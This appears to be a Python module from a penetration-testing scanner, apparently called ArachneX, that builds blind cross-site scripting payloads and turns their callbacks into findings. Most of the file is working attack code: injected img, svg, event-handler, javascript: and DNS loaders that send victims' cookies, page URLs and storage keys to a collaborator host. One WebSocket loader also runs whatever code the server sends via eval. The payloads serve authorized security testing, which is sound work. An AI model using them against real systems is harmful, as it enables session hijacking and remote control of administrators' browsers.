"""
Blind XSS.

Blind XSS fires inside an internal tool (admin panel, log viewer, CRM
dashboard, BI tool) — somewhere the tester cannot see the rendered DOM.
We confirm execution by getting the *victim* browser to call home.

ArachneX runs an embedded FastAPI collaborator listening on the
configured domain. It accepts:

  • HTTP GET/POST  on /b/<scan_id>/<probe_id>
  • WebSocket      on /ws/<scan_id>/<probe_id>
  • DNS exfil      via subdomain probes  <probe_id>.<scan_id>.<collab>

Each callback captures: requesting IP, User-Agent, Referer, fetched JS
data (cookies, localStorage, page URL), and timestamps. The engine
correlates callbacks with the injection points that fired them.

This module produces *payloads* (small JS loaders that beacon back) and
parses incoming callbacks. The HTTP server itself is in
arachnex.server.blind_collab.
"""

from __future__ import annotations

import logging
import secrets
from dataclasses import dataclass
from typing import Optional

from arachnex.core.target import Finding, HttpMethod, InjectionPoint, Severity, Target, XSSClass

log = logging.getLogger("arachnex.detect.blind")


# --------------------------------------------------------------------------- #
# Payload templates
# --------------------------------------------------------------------------- #


def _basic_loader(collab_url: str, probe_id: str) -> str:
    """
    Standard image-pixel loader. Works in most contexts.

    Beacon includes: URL, cookies (non-HttpOnly), userAgent, referrer,
    localStorage keys (not values; PII-conservative by default), title.
    """
    return (
        f'<img src=x onerror="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,r:document.referrer,'
        f'ua:navigator.userAgent,ls:Object.keys(localStorage||{{}}),'
        f'p:Object.keys(sessionStorage||{{}})}})}}).catch(()=>'
        f'new Image().src=\'{collab_url}/b/{probe_id}/pix?u=\'+'
        f'encodeURIComponent(location.href))">'
    )


def _svg_loader(collab_url: str, probe_id: str) -> str:
    """SVG-namespace variant; sometimes survives sanitizers that strip <img>."""
    return (
        f'<svg/onload="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,r:document.referrer,ua:navigator.userAgent}})}})">'
    )


def _websocket_loader(collab_ws: str, probe_id: str) -> str:
    """
    WebSocket loader: maintains a longer-lived channel to capture
    progressive DOM exfil (useful when the tester wants to interact).
    """
    return (
        f'<img src=x onerror="(()=>{{let s=new WebSocket(\'{collab_ws}/ws/{probe_id}\');'
        f's.onopen=()=>s.send(JSON.stringify({{u:location.href,t:document.title,'
        f'c:document.cookie,ua:navigator.userAgent}}));'
        f's.onmessage=(e)=>{{try{{eval(e.data)}}catch{{}}}}}})()">'
    )


def _event_handler_only(collab_url: str, probe_id: str) -> str:
    """Bare event-handler payload — for use inside an existing <input> tag."""
    return (
        f' autofocus onfocus="fetch(\'{collab_url}/b/{probe_id}\',{{method:\'POST\','
        f'body:document.cookie}})" '
    )


def _href_javascript(collab_url: str, probe_id: str) -> str:
    """For href/src reflection contexts."""
    return (
        f"javascript:fetch('{collab_url}/b/{probe_id}',{{method:'POST',"
        f"body:JSON.stringify({{c:document.cookie,u:location.href}})}})"
    )


def _dns_only(collab_dns: str, probe_id: str) -> str:
    """
    Pure DNS exfil — works behind firewalls that allow DNS but block
    outbound HTTP. Encodes a short token in a subdomain.
    """
    return (
        f'<img src=x onerror="new Image().src=\'//{probe_id}.{collab_dns}/x\'">'
    )


@dataclass
class BlindPayloadVariant:
    label: str
    value: str
    marker_probe_id: str
    contexts: tuple[str, ...]    # which contexts this variant fits


def build_blind_payloads(
    collab_http: str,
    collab_ws: Optional[str],
    collab_dns: Optional[str],
    scan_id: str,
) -> list[BlindPayloadVariant]:
    """
    Build one BlindPayloadVariant per probe. Each variant uses its OWN
    probe_id so the collaborator can attribute callbacks back to the
    specific (target, injection_point, variant) tuple.

    The engine should call this per injection point — not globally — so
    we can correlate.
    """
    pid_prefix = secrets.token_hex(4)
    out: list[BlindPayloadVariant] = []

    def _pid(suffix: str) -> str:
        return f"{scan_id[:8]}-{pid_prefix}-{suffix}"

    out.append(BlindPayloadVariant(
        label="img_onerror_fetch",
        value=_basic_loader(collab_http, _pid("img")),
        marker_probe_id=_pid("img"),
        contexts=("html_body", "attr_dq", "attr_sq", "attr_uq", "svg_foreign"),
    ))
    out.append(BlindPayloadVariant(
        label="svg_onload_fetch",
        value=_svg_loader(collab_http, _pid("svg")),
        marker_probe_id=_pid("svg"),
        contexts=("html_body", "svg_foreign", "mathml_foreign"),
    ))
    out.append(BlindPayloadVariant(
        label="event_handler_only",
        value=_event_handler_only(collab_http, _pid("evh")),
        marker_probe_id=_pid("evh"),
        contexts=("attr_dq", "attr_sq", "attr_uq"),
    ))
    out.append(BlindPayloadVariant(
        label="javascript_scheme",
        value=_href_javascript(collab_http, _pid("href")),
        marker_probe_id=_pid("href"),
        contexts=("url",),
    ))
    if collab_ws:
        out.append(BlindPayloadVariant(
            label="websocket_loader",
            value=_websocket_loader(collab_ws, _pid("ws")),
            marker_probe_id=_pid("ws"),
            contexts=("html_body",),
        ))
    if collab_dns:
        out.append(BlindPayloadVariant(
            label="dns_exfil",
            value=_dns_only(collab_dns, _pid("dns")),
            marker_probe_id=_pid("dns"),
            contexts=("html_body", "attr_dq"),
        ))
    return out


# --------------------------------------------------------------------------- #
# Callback record (populated by the server, consumed here)
# --------------------------------------------------------------------------- #


@dataclass
class BlindCallback:
    probe_id: str
    timestamp_ms: int
    remote_ip: str
    user_agent: str
    referer: Optional[str]
    page_url: Optional[str]
    page_title: Optional[str]
    cookies: Optional[str]
    raw_body: Optional[str]


def callback_to_finding(
    target: Target,
    ip: InjectionPoint,
    payload_value: str,
    callback: BlindCallback,
) -> Finding:
    """Promote a confirmed blind callback to a Finding."""
    extra = {
        "callback_ip": callback.remote_ip,
        "callback_ua": callback.user_agent,
        "callback_referer": callback.referer or "",
        "callback_page_url": callback.page_url or "",
        "callback_page_title": callback.page_title or "",
    }
    title = f"Blind XSS via `{ip.name}` — triggered from {callback.remote_ip}"
    return Finding(
        xss_class=XSSClass.BLIND,
        severity=Severity.HIGH,        # default; triage may bump to CRITICAL
        confidence=0.95,               # actual execution observed
        target_url=target.url,
        method=target.method,
        injection_point=ip,
        payload=payload_value,
        title=title,
        extra=extra,
        cwe=["CWE-79"],
    )
